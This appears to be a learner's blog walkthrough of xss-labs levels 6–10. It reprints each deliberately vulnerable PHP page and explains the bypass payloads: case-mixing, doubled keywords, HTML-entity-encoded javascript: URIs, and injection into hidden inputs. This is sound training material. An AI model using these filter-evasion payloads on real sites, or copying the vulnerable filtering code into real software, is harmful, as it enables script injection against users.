---
title: "Xss-labs Full Walkthrough & XSS Notes02"
publishDate: 2025-12-26 16:49:00
description: "Analysis and Notes"
tags: ["XSS", "Notes", "Web"]
language: "English"

---

> Notes compiled by a beginner for learning and reference. I am not a professional; please forgive any oversights. Acknowledgments to others and AI assistance where applicable.
> 
> I chose to present the source code directly (normally you cannot see the full backend source, only the page source). On one hand, this saves space used by trial-and-error payloads; on the other hand, it makes it more intuitive for future review without needing to run other tools. I believe most filtering methods can be discovered through testing—just try a few more times. (Okay, actually, I don't think anyone else will read this; it's mostly for my own review)

## Level 6

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level7.php?keyword=move up!"; 
}
</script>
<title>欢迎来到level6</title>
</head>
<body>
<h1 align=center>欢迎来到level6</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level6.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>


```

1.As seen, the replacements here are numerous and terrifying.

```php
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
```

However, notice that it lacks the conversion to lowercase from the previous level. It becomes very simple: [Bypassing Filters](#bypassing-filters)

2.We can construct as follows:

```php
" Onclick="alert(1) // Randomly change case for specific keywords
```

Others are omitted.

## Level 7

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level8.php?keyword=nice try!"; 
}
</script>
<title>欢迎来到level7</title>
</head>
<body>
<h1 align=center>欢迎来到level7</h1>
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level7.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>

```

1.Here, the case sensitivity loophole from Level 6 is patched, and attributes (keywords of attributes) are basically filtered (replaced with empty string).

```php
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
```

2.[Bypassing Filters](#bypassing-filters). We can consider Double Writing Bypass.

For example, `script`, `href`, `onclick` can all be considered and used.

```php
" oonnclick="alert(1)
```

> Note ⚠️: Double writing here is not `ononclick`; writing it like that is useless no matter how many times. The goal is to have the middle part replaced by empty, letting the head and tail connect.

## Level 8

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level9.php?keyword=not bad!"; 
}
</script>
<title>欢迎来到level8</title>
</head>
<body>
<h1 align=center>欢迎来到level8</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>

```

1.The filtering in this level basically patches all previous holes: case sensitivity, keyword replacement, and even `"` is forcibly escaped.

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
```

2.The injection point for this level is not the original input box, but below it.

```php
echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
```

The input `$str7` is placed directly into the `href` attribute of the `<a>` tag. **This means:** We don't need to "escape" to close the tag; we are already in a place where JS can be executed (`href` attribute supports `javascript:` pseudo-protocol).

The `href` attribute has a property: it performs **HTML decoding** first, restores the characters, and then executes.

3.Thus we can construct:

```html
javasc&#114;ipt:alert(1)
```

### HTML Entity Encoding

This mainly targets PHP which won't perform HTML decoding, allowing bypass of filters, while `href` automatically decodes.

| **Method**                         | **Payload Code**                                                                                                   | **Remarks**                                                 |
| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------- |
| **Single Character (Recommended)** | `javasc&#114;ipt:alert(1)`                                                                                         | Only change one letter `r`, shortest and fastest.           |
| **Head Character**                 | `java&#115;cript:alert(1)`                                                                                         | Only change letter `s`.                                     |
| **Insert Tab**                     | `javasc&#9;ript:alert(1)`                                                                                          | Utilize `&#9;` (Tab key) to break the word.                 |
| **Full Encoding** <br>             | `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;`<br>`&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;` | **Line 1 is** `javascript:`<br>**Line 2 is** `alert(1)`<br> |

## Level 9

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level10.php?keyword=well done!"; 
}
</script>
<title>欢迎来到level9</title>
</head>
<body>
<h1 align=center>欢迎来到level9</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
<center><img src=level9.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```

1.The overall logic is the same as Level 8, using the friendly link.

2.But here a check is added to see if our input link is valid, meaning direct pseudo-protocol + encoding from the previous level is invalid.

```php
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```

Analyzing this, it only checks if the passed parameter contains `http://`. This means we can insert it anywhere.

3.So we can construct based on the previous level, using `//` comment to make the subsequent part ineffective.

```php
javasc&#114;ipt:alert(1) // http://
```

Thinking differently, we don't even need comments; simply insert it into `alert()`. Note that you must use `'` to wrap it here.

```php
javasc&#114;ipt:alert('http://')
```

## Level 10

Source Code Presentation

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level11.php?keyword=good job!"; 
}
</script>
<title>欢迎来到level10</title>
</head>
<body>
<h1 align=center>欢迎来到level10</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str11 = $_GET["t_sort"];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form id=search>
<input name="t_link"  value="'.'" type="hidden">
<input name="t_history"  value="'.'" type="hidden">
<input name="t_sort"  value="'.$str33.'" type="hidden">
</form>
</center>';
?>
<center><img src=level10.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.This level relies on passing parameters to construct the payload, but the problem is, what do we pass parameters to?

2.Checking the page source, we see three hidden `input` tags.

```php
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
```

We might as well pass parameters to all three, for example:

```php
t_link=1&t_history=1&t_sort=1
```

From this, we discover the injection point is `t_sort`.

3.Now we can construct just like before.

```php
t_sort=" type="text" onclick="alert(1) 
```

| **Obstacle**                    | **Solution**                                                                                      |
| ------------------------------- | ------------------------------------------------------------------------------------------------- |
| **Cannot find injection point** | Read source (or blind guess), find hidden `t_sort` parameter.                                     |
| **Filters `< >`**               | Give up tag escape, switch to **Attribute Injection** (adding attributes inside the tag).         |
| **`type="hidden"`**             | Inject `type="text"` to overwrite original attribute, making the element visible for interaction. |




